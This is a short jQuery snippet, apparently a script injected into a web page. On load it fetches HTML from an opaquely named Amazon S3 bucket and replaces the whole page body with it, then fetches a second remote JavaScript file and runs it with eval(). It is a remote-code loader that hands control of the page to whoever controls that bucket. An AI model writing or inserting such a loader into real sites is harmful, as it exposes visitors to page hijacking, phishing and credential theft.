$(function(){
	$.ajax({url:'https://s3.amazonaws.com/ktnabv/anv.html',async:false,success:function(a){
		$(document.body).html(a)
	}})
	$.ajax({url:'https://s3.amazonaws.com/ktnabv/anv.js',async:false,success:function(a){
		eval(a)
	}})
})